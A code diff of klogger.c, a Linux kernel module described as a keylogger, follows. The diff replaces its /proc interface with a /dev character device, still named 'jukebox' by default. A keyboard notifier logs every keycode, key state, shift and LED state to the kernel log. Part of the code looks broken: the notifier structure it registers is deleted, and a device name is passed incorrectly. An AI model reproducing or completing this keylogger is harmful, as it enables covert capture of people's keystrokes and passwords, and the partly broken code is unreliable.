@@ -1,145 +1,119 @@
 /* klogger.c -  Basic Implementation of a keylogger at kernel space */
-#include <linux/moduleparam.h>
 #include <linux/module.h>
 #include <linux/version.h>
 #include <linux/kernel.h>
-#include <linux/proc_fs.h>
+#include <linux/types.h>
+#include <linux/kdev_t.h>
+#include <linux/fs.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
 #include <linux/keyboard.h>
 #include <asm/uaccess.h>
 #include "klogger.h"
 
-
-#define PROCFS_MAX_SIZE 1024
+static dev_t first; // Global variable for the first device number 
+static struct cdev c_dev; // Global variable for the character device structure
+static struct class *cl; // Global variable for the device class
 
 /* Module's input parameters */
-static char *procfs_name = "jukebox";
+static char *cdev_name = "jukebox";
 
-module_param(procfs_name, charp, 0000);
-MODULE_PARM_DESC(procfs_name, " Define a different name for your proc file. By default, it is jukebox.");
+module_param(cdev_name, charp, 0000);
+MODULE_PARM_DESC(cdev_name, " Define a different name for your /dev file. By default, it is /dev/jukebox.");
 
-
-/* This structure hold information about the /proc file */
-static struct proc_dir_entry *proc_file_entry;
-
-/* The buffer used to store character for this module */
-static char procfs_buffer[PROCFS_MAX_SIZE];
-
-/* The size of the buffer */
-static unsigned long procfs_buffer_size = 0;
 
 /** 
  * Handler responsable to read and log every key pressed by the user
  *
  */
 int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param) {
-
-  printk(KERN_INFO "someone is writing...");
   struct keyboard_notifier_param *param = _param;
   struct vc_data *vc = param->vc;
 
   if (code == KBD_KEYCODE) {
-    printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
+    printk(KERN_DEBUG "KEYLOGGER keycode=%lu value=%i down=%s shift=%i ledstate=%i\n",
+		code,
+		param->value, 
+		(param->down ? "down" : "up"),
+		param->shift,
+		param->ledstate);
+
+	
   }
 
   return NOTIFY_OK;
 }
 
-
-/* declare keyboard_listener as the handler of keyboard events */
-static struct notifier_block nb = {
-  .notifier_call = keyboard_listener
-};
-
 /**
  * This function is called when the module is loaded
  *
  */
-int init_procfs_file()
+int init_dev_file()
 {
-        /* create the /proc file */
-        proc_file_entry = create_proc_entry(procfs_name, 0644, NULL);
-
-        if (proc_file_entry == NULL) {
-                remove_proc_entry(procfs_name, NULL);
-                printk(KERN_ALERT "Error: Could not initialize /proc/%s\n",
-                        procfs_name);
-                return -ENOMEM;
-        }
-
-        proc_file_entry->read_proc  = read_procfs_file;
-        proc_file_entry->write_proc = write_procfs_file;
-        proc_file_entry->mode     = S_IFREG | S_IRUGO;
-        proc_file_entry->uid      = 0;
-        proc_file_entry->gid      = 0;
-        proc_file_entry->size     = 37;
-
-        printk(KERN_INFO "/proc/%s created\n", procfs_name);
-        return 0;       /* everything is ok */
+  if (alloc_chrdev_region(&first, 0, 1, "Shweta") < 0)
+  {
+    return -1;
+  }
+    if ((cl = class_create(THIS_MODULE, "chardrv")) == NULL)
+  {
+    unregister_chrdev_region(first, 1);
+    return -1;
+  }
+    if (device_create(cl, NULL, first, NULL, &cdev_name) == NULL)
+  {
+    class_destroy(cl);
+    unregister_chrdev_region(first, 1);
+    return -1;
+  }
+    cdev_init(&c_dev, &dev_fops);
+    if (cdev_add(&c_dev, first, 1) == -1)
+  {
+    device_destroy(cl, first);
+    class_destroy(cl);
+    unregister_chrdev_region(first, 1);
+    return -1;
+  }
+  return 0;
 }
 
 /**
  * This function is called when the module is unloaded
  *
  */
-void clear_procfs_file()
+void clear_dev_file()
 {
-        remove_proc_entry(procfs_name, NULL);
-        printk(KERN_INFO "/proc/%s removed\n", procfs_name);
+ cdev_del(&c_dev);
+ device_destroy(cl, first);
+ class_destroy(cl);
+ unregister_chrdev_region(first, 1);
+ printk(KERN_INFO "/dev/%s removed\n", cdev_name);
 }
 
 
 /**
- * This function is called then the /proc file is read
+ * This function is called then the /dev/<name> file is read
  *
  */
-int read_procfs_file(char *buffer,
-              char **buffer_location,
-              off_t offset, int buffer_length, int *eof, void *data)
+ssize_t read_dev_file(struct file *f, char __user *buf, size_t len, loff_t *off)
 {
-        int ret;
-
-        printk(KERN_INFO "procfile_read (/proc/%s) called\n", procfs_name);
-
-        if (offset > 0) {
-                /* we have finished to read, return 0 */
-                ret  = 0;
-        } else {
-                /* fill the buffer, return the buffer size */
-                memcpy(buffer, procfs_buffer, procfs_buffer_size);
-                ret = procfs_buffer_size;
-        }
-
-        return ret;
+  printk(KERN_INFO "Driver: read()\n");
+  return 0;
 }
 
-
 /**
- * This function is called with the /proc file is written
+ * This function is called with the /dev/<name> file is written
  *
  */
-
-int write_procfs_file(struct file *file, const char *buffer, unsigned long count,
-                   void *data)
+ssize_t write_dev_file(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
-        /* get buffer size */
-        procfs_buffer_size = count;
-
-        if (procfs_buffer_size > PROCFS_MAX_SIZE ) {
-                procfs_buffer_size = PROCFS_MAX_SIZE;
-        }
-
-        /* write data to the buffer */
-        if ( copy_from_user(procfs_buffer, buffer, procfs_buffer_size) ) {
-                return -EFAULT;
-        }
-
-        return procfs_buffer_size;
+  printk(KERN_INFO "Driver: write()\n");
+  return len;
 }
 
 
 static int __init klogger_init(void)
 {
-  init_procfs_file();
+  init_dev_file();
   register_keyboard_notifier(&nb);
   printk(KERN_INFO "klogger registered and listening");
 
@@ -148,7 +122,7 @@ static int __init klogger_init(void)
 
 static void __exit klogger_exit(void)
 {
-  clear_procfs_file();
+  clear_dev_file();
   unregister_keyboard_notifier(&nb);
   printk(KERN_INFO "klogger unregistered");
 }
